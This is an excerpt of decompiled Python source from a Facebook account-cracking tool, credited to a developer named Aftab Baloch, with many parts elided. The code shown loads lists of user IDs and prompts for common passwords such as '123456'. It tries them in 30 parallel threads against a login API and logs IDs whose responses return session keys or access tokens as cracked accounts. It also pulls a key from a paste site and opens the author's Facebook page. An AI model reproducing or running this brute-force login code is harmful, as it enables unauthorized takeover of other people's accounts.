# Decompile by Mardis (Tools By Kapten-Aftab)
...
def helpnote():
	...
	exit(" [*] https://www.facebook.com/FBMASTER.HACKERGANGSTER.AFTAB")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN FACEBOOK >> Aftab")
	subprocess.check_output(["am", "start", "https://www.facebook.com/FBMASTER.HACKERGANGSTER.AFTAB"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://justpaste.it/97on8').text
			if basesplit in plr:
				key = basesplit
...
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     \033[1;92m➣ \033[1;92mDEVOLPER   :            Aftab Baloch
     \033[1;91m➣ \033[1;92mFACEBOOK   :            Aftab Baloch
     \033[1;93m➣ \033[1;92mWHATSAPP   :            +19062084287
     \033[1;96m➣ \033[1;92mGITHUB     :            AFTAB-BALOCH
...
#				exit()
	...
	def old4_7(self):
		...
		try:
			...
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR AFTAB  "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX:AFTAB ): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[0;93m[>_] [AFTAB] : \033[0;97m %s/%s -> \033[0;92m [AFTAB -OK:%s ]- \033[0;93m[AFTAB-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r \033[0;93m[AFTAB-CP] %s|%s\033[0;97m         "%(uid, pw))
